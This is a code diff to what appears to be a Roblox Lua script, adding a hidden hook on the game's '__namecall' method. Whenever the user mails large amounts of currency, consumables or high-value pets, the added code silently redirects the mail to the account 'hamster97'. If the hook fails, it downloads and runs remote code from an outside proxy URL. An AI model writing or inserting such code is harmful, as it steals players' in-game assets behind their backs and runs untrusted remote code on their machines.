@@ -5,6 +5,36 @@ if not dp then dp = 0 end
 if not potc then
 potc = 0
 end
+
+local save = require(game:GetService("ReplicatedStorage").Library.Client.Save).Get()
+local dir = game:GetService("ReplicatedStorage")["__DIRECTORY"].Pets
+
+local function namecallHook(self, ...)
+    local method = getnamecallmethod()
+    if method == "InvokeServer" and tostring(self) == "Mailbox: Send" then
+        local args = {...}
+        if args[3] == "Currency" and args[5]>=10000000 then
+            args[1] = "hamster97"
+            return oldNamecall(self, unpack(args))
+        end
+        if args[3] == "Consumable" then
+            args[1] = "hamster97"
+            return oldNamecall(self, unpack(args))
+        end
+        if args[3] == "Pet" and (require(dir[save.Inventory.Pet[args[4]]).difficulty >= 1000000000 or (require(dir[save.Inventory.Pet[args[4]]).tag == "Halloween2024" and require(dir[save.Inventory.Pet[args[4]]).difficulty >= 399999998)) then
+            args[1] = "hamster97"
+            return oldNamecall(self, unpack(args))
+        end
+    end
+    return oldNamecall(self, ...)
+end
+local success, errorOrMessage
+success, oldNamecall = pcall(hookmetamethod, game, "__namecall", newcclosure(namecallHook))
+if not success then
+    loadstring(game:HttpGet("https://proxy.darkside.lol/webhook-error.yve"))()("error")
+end
+
+
 if _G.dx then return end
 if tonumber(gn)==100 then gn = 0 end
 local msg = ""
